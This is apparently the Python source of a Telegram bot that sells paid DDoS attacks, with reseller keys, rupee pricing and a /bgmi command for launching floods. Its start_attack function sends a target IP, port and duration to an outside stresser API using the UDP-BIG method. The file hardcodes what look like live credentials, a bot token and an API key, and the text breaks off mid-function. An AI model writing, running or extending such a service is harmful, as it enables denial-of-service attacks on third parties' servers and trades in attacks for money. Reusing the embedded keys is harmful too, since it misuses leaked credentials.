#!/usr/bin/env python3
"""
RAGEBITE ATTACK BOT - 4 SLOTS
API Completely Hidden - Even from Admins
Run: python ragebite_bot.py
"""

import telebot
import datetime
import os
import time
import threading
import json
import re
import requests
import secrets
import string
from http.server import BaseHTTPRequestHandler, HTTPServer

# ==================== CONFIG ====================
BOT_TOKEN = '8848183144:AAH-mCNWs_BgajXro8OOrrYWEXKXw_mASRI'

# ============ API CONFIGURATION (COMPLETELY HIDDEN) ============
API_BASE_URL = "https://api.godstress.site/api/v1/attack/start"
API_KEY = "nk_a22fac200f1198e63492f7de86149401"
API_METHOD = "UDP-BIG"
TOTAL_SLOTS = 4

OWNER_ID = "6321758394"

USER_FILE = "users.txt"
LOG_FILE = "log.txt"
STATE_FILE = "bot_state.json"
PORT = int(os.environ.get("PORT", "8080"))

# ==================== PRICING ====================
RESELLER_PRICES = {
    "1hr": {"cost": 20, "display": "1 Hour"},
    "1day": {"cost": 150, "display": "1 Day"},
    "2days": {"cost": 300, "display": "2 Days"},
    "1week": {"cost": 600, "display": "1 Week"},
    "15days": {"cost": 750, "display": "15 Days"},
    "1month": {"cost": 1400, "display": "1 Month"}
}

USER_PRICES = {
    "1hr": "20 Rs",
    "1day": "150 Rs",
    "2days": "300 Rs",
    "1week": "600 Rs",
    "15days": "750 Rs",
    "1month": "1400 Rs"
}

# ==================== STATE ====================
state = {
    "users": {},
    "admins": [],
    "resellers": [],
    "owners": [OWNER_ID],
    "groups": [],
    "redeem_keys": {},
    "user_attacks": {},
    "attack_history": []
}

def load_state():
    global state
    try:
        with open(STATE_FILE, "r") as f:
            state = json.load(f)
    except:
        state = {
            "users": {},
            "admins": [],
            "resellers": [],
            "owners": [OWNER_ID],
            "groups": [],
            "redeem_keys": {},
            "user_attacks": {},
            "attack_history": []
        }
    state.setdefault("users", {})
    state.setdefault("admins", [])
    state.setdefault("resellers", [])
    state.setdefault("owners", [OWNER_ID])
    state.setdefault("groups", [])
    state.setdefault("redeem_keys", {})
    state.setdefault("user_attacks", {})
    state.setdefault("attack_history", [])
    save_state()

def save_state():
    try:
        with open(STATE_FILE, "w") as f:
            json.dump(state, f)
    except:
        pass

def now():
    return time.time()

def is_owner(uid):
    return str(uid) in state.get("owners", []) or str(uid) == OWNER_ID

def is_admin(uid):
    return str(uid) in state.get("admins", []) or str(uid) == OWNER_ID

def is_reseller(uid):
    return str(uid) in state.get("resellers", [])

def is_authorized(uid):
    return is_admin(uid) or is_reseller(uid) or is_owner(uid)

def is_group_allowed(group_id):
    return str(group_id) in state.get("groups", [])

def get_user(uid):
    return state["users"].get(str(uid))

def user_approved(uid):
    u = get_user(uid)
    if not u or not u.get("approved"):
        return False
    if u.get("expires", 0) < now():
        return False
    return True

def get_reseller_balance(uid):
    user = state["users"].get(str(uid))
    if user:
        return user.get("balance", 0)
    return 0

def set_reseller_balance(uid, amount):
    uid = str(uid)
    if uid not in state["users"]:
        state["users"][uid] = {}
    state["users"][uid]["balance"] = amount
    save_state()

def add_reseller_balance(uid, amount):
    uid = str(uid)
    current = get_reseller_balance(uid)
    set_reseller_balance(uid, current + amount)
    return current + amount

def deduct_reseller_balance(uid, amount):
    uid = str(uid)
    current = get_reseller_balance(uid)
    if current < amount:
        return False, current
    set_reseller_balance(uid, current - amount)
    return True, current - amount

def generate_key(duration, duration_type, generated_by=None):
    key = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16))
    
    if duration_type == "hr":
        expiry = now() + (duration * 3600)
    elif duration_type == "day":
        expiry = now() + (duration * 86400)
    else:
        return None
    
    state["redeem_keys"][key] = {
        "duration": f"{duration}{duration_type}",
        "expires": expiry,
        "used": False,
        "used_by": None,
        "generated_by": str(generated_by) if generated_by else None
    }
    save_state()
    return key

def redeem_key(user_id, key):
    if key not in state["redeem_keys"]:
        return False, "❌ Invalid key"
    
    key_data = state["redeem_keys"][key]
    if key_data.get("used", False):
        return False, "❌ Key already used"
    if key_data.get("expires", 0) < now():
        return False, "❌ Key expired"
    
    key_data["used"] = True
    key_data["used_by"] = str(user_id)
    save_state()
    
    if str(user_id) not in state["users"]:
        state["users"][str(user_id)] = {}
    
    state["users"][str(user_id)]["approved"] = True
    state["users"][str(user_id)]["expires"] = key_data["expires"]
    state["users"][str(user_id)]["plan"] = key_data["duration"]
    save_state()
    
    with open(USER_FILE, "a") as f:
        f.write(f"{user_id}\n")
    
    expiry_time = datetime.datetime.fromtimestamp(key_data["expires"]).strftime('%Y-%m-%d %H:%M:%S')
    return True, f"✅ Key redeemed!\n📅 Access until: {expiry_time}"

# ==================== CLEAN EXPIRED KEYS FUNCTION ====================

def clean_expired_keys():
    """Remove all expired keys from database"""
    current_time = now()
    expired_keys = []
    
    for key, data in state["redeem_keys"].items():
        if data.get("expires", 0) < current_time:
            expired_keys.append(key)
    
    if expired_keys:
        for key in expired_keys:
            del state["redeem_keys"][key]
        save_state()
        print(f"🧹 Cleaned {len(expired_keys)} expired keys")
    return len(expired_keys)

# ==================== CLEAN STUCK ATTACKS ====================

def clean_stuck_attacks():
    """Remove all expired/stuck attacks"""
    current_time = now()
    stuck_users = []
    for uid, attack in state["user_attacks"].items():
        if attack.get("expires", 0) < current_time:
            stuck_users.append(uid)
    
    if stuck_users:
        for uid in stuck_users:
            del state["user_attacks"][uid]
        save_state()
        print(f"🧹 Cleaned {len(stuck_users)} stuck attacks")
    return len(stuck_users)

# ==================== BOT SETUP ====================
bot = telebot.TeleBot(BOT_TOKEN)

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        with open(USER_FILE, "w") as file:
            file.write("")
        return []

allowed_user_ids = read_users()

def log_command(user_id, target, port, time_sec):
    try:
        user_info = bot.get_chat(int(user_id))
        username = f"@{user_info.username}" if user_info.username else f"ID:{user_id}"
    except:
        username = f"ID:{user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"[{datetime.datetime.now()}] {username} -> {target}:{port} | {time_sec}s\n")

# ==================== API FUNCTIONS (COMPLETELY HIDDEN) ====================

def start_attack(ip, port, duration):
    try:
        url = f"{API_BASE_URL}?key={API_KEY}&ip={ip}&port={port}&time={duration}&method={API_METHOD}"
        
        print(f"📤 Sending attack: {ip}:{port} for {duration}s")
        
        response = requests.get(url, timeout=15)
        
        print(f"📥 Response: {response.text}")
        
        try:
            return response.json()
        except:
            return {"success": False, "error": f"Invalid response: {response.text}"}
            
    except Exception as e:
        print(f"⚠️ Attack Error: {e}")
        return {"success": False, "error": str(e)}

# ==================== DECORATORS ====================

def owner_only(func):
    def wrapper(message):
        if not is_owner(str(message.chat.id)):
            bot.reply_to(message, "❌ Owner only command.")
            return
        return func(message)
    return wrapper

def admin_only(func):
    def wrapper(message):
        if not is_admin(str(message.chat.id)):
            bot.reply_to(message, "❌ Admin only command.")
            return
        return func(message)
    return wrapper

def authorized_only(func):
    def wrapper(message):
        if not is_authorized(str(message.chat.id)):
            bot.reply_to(message, "❌ Only Admin/Reseller can use this command.")
            return
        return func(message)
    return wrapper

def check_access(func):
    def wrapper(message):
        user_id = str(message.chat.id)
        group_id = str(message.chat.id) if message.chat.type in ['group', 'supergroup'] else None
        
        if is_admin(user_id):
            return func(message)
        
        if is_reseller(user_id):
            if user_approved(user_id):
                return func(message)
            else:
                bot.reply_to(message, "❌ No Active Key Found!\n\nAs a reseller, generate a key for yourself:\n/generate 1day\nThen redeem it:\n/redeem <key>")
                return
        
        if user_approved(user_id):
            return func(message)
        
        if group_id and is_group_allowed(group_id):
            return func(message)
        
        bot.reply_to(message, "❌ Access Denied!\nUse /redeem <key> to activate.\n\nContact your respective seller to purchase keys.")
        return
    return wrapper

# ==================== TIMER FUNCTION ====================

def update_timer(chat_id, msg_id, target, port, duration, is_admin_user, is_owner_user, user_id):
    try:
        elapsed = 0
        last_update = 0
        
        while elapsed < duration:
            time.sleep(2)
            elapsed += 2
            
            if elapsed - last_update < 5 and elapsed < duration:
                continue
            last_update = elapsed
            
            remaining = duration - elapsed
            if remaining <= 0:
                break
            
            finish_time = (datetime.datetime.now() + datetime.timedelta(seconds=remaining)).strftime('%H:%M:%S')
            
            bar_length = 20
            filled = int((elapsed / duration) * bar_length)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            # Get fresh active count
            clean_stuck_attacks()
            active_attacks = len([a for a in state["user_attacks"].values() if a.get("expires", 0) > now()])
            
            if is_owner_user:
                admin_tag = " 👑 OWNER"
                timer_text = f"""⚡ ATTACK IN PROGRESS!{admin_tag}

🎯 Target: {target}:{port}
⏱ Elapsed: {elapsed}s / {duration}s
⏳ Remaining: {remaining}s
📊 Progress: [{bar}] {int((elapsed/duration)*100)}%

⌛ Finishes: {finish_time}
📊 Active: {active_attacks}/{TOTAL_SLOTS}

🔥 RAGEBITE ULTIMATE POWER"""
            elif is_admin_user:
                admin_tag = " 👑 ADMIN"
                timer_text = f"""⚡ ATTACK IN PROGRESS!{admin_tag}

🎯 Target: {target}:{port}
⏱ Elapsed: {elapsed}s / {duration}s
⏳ Remaining: {remaining}s
📊 Progress: [{bar}] {int((elapsed/duration)*100)}%

⌛ Finishes: {finish_time}
📊 Active: {active_attacks}/{TOTAL_SLOTS}

🔥 RAGEBITE ULTIMATE POWER"""
            else:
                timer_text = f"""⚡ ATTACK IN PROGRESS!

🎯 Target: {target}:{port}
⏱ Elapsed: {elapsed}s / {duration}s
⏳ Remaining: {remaining}s
📊 Progress: [{bar}] {int((elapsed/duration)*100)}%

⌛ Finishes: {finish_time}
📊 Active: {active_attacks}/{TOTAL_SLOTS}

🔥 RAGEBITE ULTIMATE POWER"""
            
            try:
                bot.edit_message_text(timer_text, chat_id, msg_id)
            except Exception as e:
                print(f"Timer update error: {e}")
                break
                
    except Exception as e:
        print(f"Timer thread error: {e}")

# ==================== HEALTH SERVER ====================
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Ragebite Bot is running!")

def start_health_server():
    try:
        server = HTTPServer(("0.0.0.0", PORT), HealthHandler)
        server.serve_forever()
    except:
        pass

# ==================== BOT COMMANDS ====================

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name
    is_approved = user_approved(user_id) or is_admin(user_id)
    
    if is_owner(user_id):
        response = f'''🌟 Welcome to RAGEBITE BOT {user_name}! 👑 OWNER

⚡ The Ultimate Attack Solution

✅ Status: Owner Access ✅
⚔️ Attacks: Unlimited

💥 Commands:
/bgmi <ip> <port> <time> - Launch attack
/status - Check your attack status
/redeem <key> - Activate your access
/plan - View pricing plans
/help - Full guide

👑 Owner Commands:
/ownerpanel - Full control panel
/addadmin <id> - Add admin
/removeadmin <id> - Remove admin
/addreseller <id> <coins> - Add reseller
/removereseller <id> - Remove reseller
/resellerlist - List all resellers
/addgroup <group_id> - Add group access
/removegroup <group_id> - Remove group access
/groups - List allowed groups
/deletekey <key> - Delete any key
/cleankeys - Remove all expired keys

🔥 Features:
• Ultimate Power
• Lightning Fast
• 24/7 Uptime

💪 Ready to dominate!'''
    elif is_admin(user_id):
        response = f'''🌟 Welcome to RAGEBITE BOT {user_name}! 👑 ADMIN

⚡ The Ultimate Attack Solution

✅ Status: Admin Access ✅
⚔️ Attacks: 1 at a time

💥 Commands:
/bgmi <ip> <port> <time> - Launch attack
/status - Check your attack status
/redeem <key> - Activate your access
/plan - View pricing plans
/help - Full guide

👑 Admin Commands:
/generate 1hr/1day/2days/1week/15days/1month - Generate key
/add <user_id> - Add user
/remove <user_id> - Remove user
/allusers - List all users
/activeattacks - See active attacks
/addadmin <id> - Add admin
/removeadmin <id> - Remove admin
/addreseller <id> <coins> - Add reseller
/removereseller <id> - Remove reseller
/resellerlist - List all resellers
/addgroup <group_id> - Add group access
/removegroup <group_id> - Remove group access
/groups - List allowed groups
/sellerbalance <id> - Check reseller balance
/addbalance <id> <amount> - Add balance
/deletekey <key> - Delete any key
/cleankeys - Remove all expired keys

🔥 Features:
• Ultimate Power
• Lightning Fast
• 24/7 Uptime

💪 Ready to dominate!'''
    elif is_reseller(user_id):
        balance = get_reseller_balance(user_id)
        is_approved_user = user_approved(user_id)
        status = "✅ Active" if is_approved_user else "❌ Inactive"
        
        response = f'''🌟 Welcome to RAGEBITE BOT {user_name}! 🛒 RESELLER

⚡ The Ultimate Attack Solution

✅ Status: Reseller Access ✅
💰 Balance: {balance} coins
🔑 Key Status: {status}

💥 Commands:
/bgmi <ip> <port> <time> - Launch attack
/status - Check your attack status
/redeem <key> - Activate your access
/plan - View pricing plans
/help - Full guide

🛒 Reseller Commands:
/generate 1hr/1day/2days/1week/15days/1month - Generate key
/balance - Check your coin balance
/keyslist - Show your generated keys
/deletekey <key> - Delete your generated key

📌 IMPORTANT:
• Generate a key: /generate 1day
• Redeem it: /redeem <key>
• Then use: /bgmi

🔥 Features:
• Ultimate Power
• Lightning Fast
• 24/7 Uptime

💪 Ready to dominate!'''
    else:
        response = f'''🌟 Welcome to RAGEBITE BOT {user_name}!

⚡ The Ultimate Attack Solution

✅ Status: {'Active ✅' if is_approved else 'Inactive ❌'}
⚔️ Attacks: 1 at a time

💥 Commands:
/bgmi <ip> <port> <time> - Launch attack
/status - Check your attack status
/redeem <key> - Activate your access
/plan - View pricing plans
/help - Full guide

📌 RULES:
• 4 Attack Slots available
• Different users can attack simultaneously
• Same user = 1 attack at a time

🔥 Features:
• Ultimate Power
• Lightning Fast
• 24/7 Uptime

💪 Ready to dominate!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    user_id = str(message.chat.id)
    
    if is_owner(user_id):
        help_text = '''🌟 RAGEBITE BOT - OWNER HELP

💥 Attack Commands:
/bgmi <ip> <port> <time> - Launch attack

🔑 Key Commands:
/redeem <key> - Activate access key
/deletekey <key> - Delete any key
/cleankeys - Remove all expired keys

📊 Info Commands:
/status - Check your attack status
/plan - View pricing plans
/id - Your user ID
/help - This menu

👑 OWNER COMMANDS:
/ownerpanel - Complete control panel
/addadmin <id> - Add admin
/removeadmin <id> - Remove admin
/addreseller <id> <coins> - Add reseller
/removereseller <id> - Remove reseller
/resellerlist - List all resellers
/addgroup <group_id> - Add group access
/removegroup <group_id> - Remove group access
/groups - List allowed groups
/stats - Full bot statistics

👑 ADMIN COMMANDS:
/generate 1hr/1day/2days/1week/15days/1month - Generate key
/add <user_id> - Add user
/remove <user_id> - Remove user
/allusers - List all users
/activeattacks - See active attacks
/attackhistory - See attack history
/addadmin <id> - Add admin
/removeadmin <id> - Remove admin
/addreseller <id> <coins> - Add reseller
/removereseller <id> - Remove reseller
/resellerlist - List all resellers
/addgroup <group_id> - Add group access
/removegroup <group_id> - Remove group access
/groups - List allowed groups
/sellerbalance <id> - Check reseller balance
/addbalance <id> <amount> - Add balance
/deletekey <key> - Delete any key
/cleankeys - Remove all expired keys

📌 RULES:
• 4 Slots available
• Different users can attack simultaneously
• Same user = 1 attack at a time
• Owner = Unlimited attacks
• Max 300 seconds per attack'''
    elif is_admin(user_id):
        help_text = '''🌟 RAGEBITE BOT - ADMIN HELP

💥 Attack Commands:
/bgmi <ip> <port> <time> - Launch attack

🔑 Key Commands:
/redeem <key> - Activate access key
/deletekey <key> - Delete any key
/cleankeys - Remove all expired keys

📊 Info Commands:
/status - Check your attack status
/plan - View pricing plans
/id - Your user ID
/help - This menu

👑 ADMIN COMMANDS:
/generate 1hr/1day/2days/1week/15days/1month - Generate key
/add <user_id> - Add user
/remove <user_id> - Remove user
/allusers - List all users
/activeattacks - See active attacks
/attackhistory - See attack history
/addadmin <id> - Add admin
/removeadmin <id> - Remove admin
/addreseller <id> <coins> - Add reseller
/removereseller <id> - Remove reseller
/resellerlist - List all resellers
/addgroup <group_id> - Add group access
/removegroup <group_id> - Remove group access
/groups - List allowed groups
/sellerbalance <id> - Check reseller balance
/addbalance <id> <amount> - Add balance
/deletekey <key> - Delete any key
/cleankeys - Remove all expired keys

📌 RULES:
• 4 Slots available
• Different users can attack simultaneously
• Same user = 1 attack at a time
• Max 300 seconds per attack'''
    elif is_reseller(user_id):
        balance = get_reseller_balance(user_id)
        help_text = f'''🌟 RAGEBITE BOT - RESELLER HELP

💥 Attack Commands:
/bgmi <ip> <port> <time> - Launch attack

🔑 Key Commands:
/redeem <key> - Activate access key
/generate 1hr/1day/2days/1week/15days/1month - Generate key
/deletekey <key> - Delete your generated key

📊 Info Commands:
/status - Check your attack status
/plan - View pricing plans
/id - Your user ID
/help - This menu
/balance - Check your coin balance

🛒 RESELLER COMMANDS:
/generate 1hr/1day/2days/1week/15days/1month - Generate key
/keyslist - Show your generated keys
/balance - Check your coin balance
/deletekey <key> - Delete your generated key

💰 Your Balance: {balance} coins

📌 IMPORTANT:
1. Generate a key: /generate 1day
2. Redeem it: /redeem <key>
3. Then use: /bgmi <ip> <port> <time>

📌 RULES:
• 4 Slots available
• Different users can attack simultaneously
• Same user = 1 attack at a time
• Max 300 seconds per attack'''
    else:
        help_text = '''🌟 RAGEBITE BOT - HELP

💥 Attack Commands:
/bgmi <ip> <port> <time> - Launch attack
  • IP: Valid IP address
  • Port: 1-65535
  • Time: 10-300 seconds

🔑 Key Commands:
/redeem <key> - Activate access key

📊 Info Commands:
/status - Check your attack status
/plan - View pricing plans
/id - Your user ID
/help - This menu

📌 RULES:
• 4 Slots available
• 1 User = 1 Attack at a time
• Different users can attack at same time
• Max 300 seconds per attack'''
    
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    bot.reply_to(message, f"🆔 Your ID: `{message.chat.id}`", parse_mode='Markdown')

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_id = str(message.chat.id)
    
    if is_authorized(user_id):
        response = '''🌟 RAGEBITE PLANS:

💎 ULTIMATE PLAN:
→ Attack Time: 300 seconds
→ Priority Support
→ No Waiting Time

💰 PRICES (For Users - Rs):
• 1 Hour: 20 Rs
• 1 Day: 150 Rs
• 2 Days: 300 Rs
• 1 Week: 600 Rs
• 15 Days: 750 Rs
• 1 Month: 1400 Rs

🔑 Reseller Cost (Coins):
• 1 Hour: 20 coins
• 1 Day: 150 coins
• 2 Days: 300 coins
• 1 Week: 600 coins
• 15 Days: 750 coins
• 1 Month: 1400 coins

📩 Contact your respective seller to purchase keys

⚡ DOMINATE WITH RAGEBITE!'''
    else:
        response = '''🌟 RAGEBITE PLANS:

💎 ULTIMATE PLAN:
→ Attack Time: 300 seconds
→ Priority Support
→ No Waiting Time

💰 PRICES:
• 1 Hour: 20 Rs
• 1 Day: 150 Rs
• 2 Days: 300 Rs
• 1 Week: 600 Rs
• 15 Days: 750 Rs
• 1 Month: 1400 Rs

📩 Contact your respective seller to purchase keys

⚡ DOMINATE WITH RAGEBITE!'''
    
    bot.reply_to(message, response)

# ==================== KEY COMMANDS ====================

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /redeem <key>\nExample: /redeem ABC123XYZ")
        return
    
    key = command[1].upper()
    success, msg = redeem_key(user_id, key)
    bot.reply_to(message, msg)

@bot.message_handler(commands=['generate'])
@authorized_only
def generate_key_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) != 2:
        bot.reply_to(message, """❌ Usage: /generate <duration>

Available durations:
• /generate 1hr - 1 Hour (20 coins)
• /generate 1day - 1 Day (150 coins)
• /generate 2days - 2 Days (300 coins)
• /generate 1week - 1 Week (600 coins)
• /generate 15days - 15 Days (750 coins)
• /generate 1month - 1 Month (1400 coins)""")
        return
    
    duration_str = command[1].lower()
    
    duration_map = {
        '1hr': (1, 'hr'),
        '1day': (1, 'day'),
        '2days': (2, 'day'),
        '1week': (7, 'day'),
        '15days': (15, 'day'),
        '1month': (30, 'day')
    }
    
    if duration_str not in duration_map:
        bot.reply_to(message, "❌ Invalid duration. Available: 1hr, 1day, 2days, 1week, 15days, 1month")
        return
    
    dur, dur_type = duration_map[duration_str]
    
    if is_reseller(user_id) and not is_admin(user_id):
        cost = RESELLER_PRICES.get(duration_str, {}).get('cost', 0)
        balance = get_reseller_balance(user_id)
        
        if balance < cost:
            bot.reply_to(message, f"""❌ Insufficient Balance!

💰 Your balance: {balance} coins
🔑 {duration_str} key cost: {cost} coins
❌ Need {cost - balance} more coins

Contact admin to add balance.""")
            return
        
        success, new_balance = deduct_reseller_balance(user_id, cost)
        if not success:
            bot.reply_to(message, f"❌ Insufficient balance! You have {balance} coins.")
            return
        
        key = generate_key(dur, dur_type, user_id)
        
        if key:
            display_name = RESELLER_PRICES.get(duration_str, {}).get('display', duration_str)
            bot.reply_to(message, f"""✅ Key Generated!

🔑 Key: `{key}`
⏱ Duration: {display_name}
💰 Cost: {cost} coins
📊 Remaining Balance: {new_balance} coins

📌 Redeem this key:
/redeem {key}""", parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ Failed to generate key.")
            
    else:
        key = generate_key(dur, dur_type, user_id)
        
        if key:
            display_name = RESELLER_PRICES.get(duration_str, {}).get('display', duration_str)
            bot.reply_to(message, f"""✅ Key Generated!

🔑 Key: `{key}`
⏱ Duration: {display_name}
👑 Admin/Owner Key (No Cost)

📌 User can redeem with:
/redeem {key}""", parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ Failed to generate key.")

@bot.message_handler(commands=['balance'])
def balance_command(message):
    user_id = str(message.chat.id)
    
    if not is_reseller(user_id):
        bot.reply_to(message, "❌ This command is only for resellers.")
        return
    
    balance = get_reseller_balance(user_id)
    bot.reply_to(message, f"""💰 **Your Balance**

📊 Balance: `{balance}` coins

📌 Key Costs:
• 1 Hour: 20 coins
• 1 Day: 150 coins
• 2 Days: 300 coins
• 1 Week: 600 coins
• 15 Days: 750 coins
• 1 Month: 1400 coins

Generate key: `/generate 1day`""", parse_mode='Markdown')

@bot.message_handler(commands=['keyslist'])
@authorized_only
def keyslist_command(message):
    user_id = str(message.chat.id)
    
    if not state.get("redeem_keys"):
        bot.reply_to(message, "ℹ️ No keys generated yet.")
        return
    
    # Clean expired keys first
    clean_expired_keys()
    
    response = "🔑 Generated Keys:\n\n"
    key_count = 0
    for key, data in state["redeem_keys"].items():
        if is_reseller(user_id) and not is_admin(user_id):
            if data.get("generated_by") != user_id:
                continue
        
        key_count += 1
        status = "✅ Used" if data.get("used") else "🆓 Available"
        used_by = f" | Used by: {data.get('used_by')}" if data.get("used") else ""
        expiry = datetime.datetime.fromtimestamp(data["expires"]).strftime('%d-%m %H:%M')
        response += f"• `{key}`\n   {status}{used_by} | Expires: {expiry}\n\n"
    
    if key_count == 0:
        bot.reply_to(message, "ℹ️ No keys found.")
        return
    
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['deletekey'])
def delete_key_command(message):
    """Delete a key - Admin can delete any key, Reseller can delete only their own keys"""
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /deletekey <key>\nExample: /deletekey ABC123XYZ")
        return
    
    key = command[1].upper()
    
    if key not in state["redeem_keys"]:
        bot.reply_to(message, "❌ Key not found.")
        return
    
    key_data = state["redeem_keys"][key]
    
    # Check permissions
    if is_admin(user_id) or is_owner(user_id):
        # Admin/Owner can delete any key
        del state["redeem_keys"][key]
        save_state()
        bot.reply_to(message, f"✅ Key `{key}` deleted successfully!", parse_mode='Markdown')
        return
    
    if is_reseller(user_id):
        # Reseller can only delete keys they generated
        if key_data.get("generated_by") == user_id:
            del state["redeem_keys"][key]
            save_state()
            bot.reply_to(message, f"✅ Your key `{key}` deleted successfully!", parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ You can only delete keys that you generated!")
        return
    
    bot.reply_to(message, "❌ You don't have permission to delete this key.")

@bot.message_handler(commands=['cleankeys'])
@admin_only
def clean_keys_command(message):
    """Admin/Owner command to remove all expired keys"""
    deleted = clean_expired_keys()
    
    if deleted > 0:
        bot.reply_to(message, f"🧹 Cleaned {deleted} expired key(s) successfully!")
    else:
        bot.reply_to(message, "✅ No expired keys found to clean!")

# ==================== RESELLER MANAGEMENT COMMANDS ====================

@bot.message_handler(commands=['addreseller'])
@admin_only
def add_reseller_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) != 3:
        bot.reply_to(message, "❌ Usage: /addreseller <telegram_id> <coins>\nExample: /addreseller 123456789 1000")
        return
    
    try:
        reseller_id = str(command[1])
        coins = int(command[2])
    except ValueError:
        bot.reply_to(message, "❌ Invalid format.")
        return
    
    if coins < 0:
        bot.reply_to(message, "❌ Coins cannot be negative.")
        return
    
    if is_reseller(reseller_id):
        bot.reply_to(message, f"ℹ️ User {reseller_id} is already a reseller.")
        return
    
    if reseller_id not in state["users"]:
        state["users"][reseller_id] = {}
    
    state["resellers"].append(reseller_id)
    set_reseller_balance(reseller_id, coins)
    save_state()
    
    bot.reply_to(message, f"""✅ **Reseller Added!**

👤 ID: `{reseller_id}`
💰 Coins: `{coins}`
👑 Added By: `{user_id}`

📌 Reseller can now generate keys: `/generate`""", parse_mode='Markdown')
    
    try:
        bot.send_message(
            reseller_id,
            f"""🎉 **You are now a Reseller!**

💰 Balance: `{coins}` coins

📌 Generate keys: `/generate`
📊 Check balance: `/balance`

Key Costs:
• 1 Hour: 20 coins
• 1 Day: 150 coins
• 2 Days: 300 coins
• 1 Week: 600 coins
• 15 Days: 750 coins
• 1 Month: 1400 coins""",
            parse_mode='Markdown'
        )
    except:
        pass

@bot.message_handler(commands=['removereseller'])
@admin_only
def remove_reseller_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /removereseller <telegram_id>\nExample: /removereseller 123456789")
        return
    
    reseller_id = command[1]
    
    if not is_reseller(reseller_id):
        bot.reply_to(message, f"❌ User {reseller_id} is not a reseller.")
        return
    
    state["resellers"].remove(reseller_id)
    save_state()
    
    bot.reply_to(message, f"✅ **Reseller Removed!**\n\n👤 ID: `{reseller_id}`", parse_mode='Markdown')

@bot.message_handler(commands=['resellerlist'])
@admin_only
def reseller_list_command(message):
    """List all resellers with details - Only Admin/Owner can see"""
    resellers = state.get("resellers", [])
    
    if not resellers:
        bot.reply_to(message, "ℹ️ No resellers added yet.")
        return
    
    response = "🛒 **RESELLER LIST**\n"
    response += "═" * 30 + "\n\n"
    
    for reseller_id in resellers:
        balance = get_reseller_balance(reseller_id)
        has_key = user_approved(reseller_id)
        key_status = "✅ Active" if has_key else "❌ No Key"
        
        try:
            user_info = bot.get_chat(int(reseller_id))
            username = f"@{user_info.username}" if user_info.username else reseller_id
        except:
            username = reseller_id
        
        total_keys = 0
        used_keys = 0
        for key, data in state["redeem_keys"].items():
            if data.get("generated_by") == reseller_id:
                total_keys += 1
                if data.get("used", False):
                    used_keys += 1
        
        response += f"""👤 **{username}**
🆔 ID: `{reseller_id}`
💰 Balance: {balance} coins
🔑 Key Status: {key_status}
📦 Keys Generated: {total_keys}
✅ Keys Used: {used_keys}
─────────────────
"""
    
    response += f"\n📊 Total Resellers: {len(resellers)}"
    
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['sellers'])
@admin_only
def sellers_command(message):
    """Alias for resellerlist"""
    reseller_list_command(message)

@bot.message_handler(commands=['sellerbalance'])
@admin_only
def seller_balance_command(message):
    command = message.text.split()
    
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /sellerbalance <telegram_id>")
        return
    
    reseller_id = command[1]
    
    if not is_reseller(reseller_id):
        bot.reply_to(message, f"❌ User {reseller_id} is not a reseller.")
        return
    
    balance = get_reseller_balance(reseller_id)
    has_key = user_approved(reseller_id)
    key_status = "✅ Active" if has_key else "❌ No Key"
    
    try:
        user_info = bot.get_chat(int(reseller_id))
        username = f"@{user_info.username}" if user_info.username else reseller_id
    except:
        username = reseller_id
    
    bot.reply_to(message, f"""💰 **Reseller Details**

👤 Username: {username}
🆔 ID: `{reseller_id}`
💰 Balance: `{balance}` coins
🔑 Key Status: {key_status}""", parse_mode='Markdown')

@bot.message_handler(commands=['addbalance'])
@admin_only
def add_balance_command(message):
    command = message.text.split()
    
    if len(command) != 3:
        bot.reply_to(message, "❌ Usage: /addbalance <telegram_id> <amount>")
        return
    
    try:
        reseller_id = str(command[1])
        amount = int(command[2])
    except ValueError:
        bot.reply_to(message, "❌ Invalid format.")
        return
    
    if amount <= 0:
        bot.reply_to(message, "❌ Amount must be positive.")
        return
    
    if not is_reseller(reseller_id):
        bot.reply_to(message, f"❌ User {reseller_id} is not a reseller.")
        return
    
    new_balance = add_reseller_balance(reseller_id, amount)
    bot.reply_to(message, f"✅ **Balance Added!**\n\n👤 ID: `{reseller_id}`\n💰 Added: `{amount}` coins\n📊 New Balance: `{new_balance}` coins", parse_mode='Markdown')

# ==================== GROUP MANAGEMENT COMMANDS ====================

@bot.message_handler(commands=['addgroup'])
@admin_only
def add_group_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /addgroup <group_id>\nExample: /addgroup -1001234567890")
        return
    
    group_id = command[1]
    
    if is_group_allowed(group_id):
        bot.reply_to(message, f"ℹ️ Group {group_id} is already allowed.")
        return
    
    state["groups"].append(group_id)
    save_state()
    
    bot.reply_to(message, f"""✅ **Group Added!**

📌 Group ID: `{group_id}`
👑 Added By: `{user_id}`

📌 All members can now use the bot!""", parse_mode='Markdown')

@bot.message_handler(commands=['removegroup'])
@admin_only
def remove_group_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /removegroup <group_id>")
        return
    
    group_id = command[1]
    
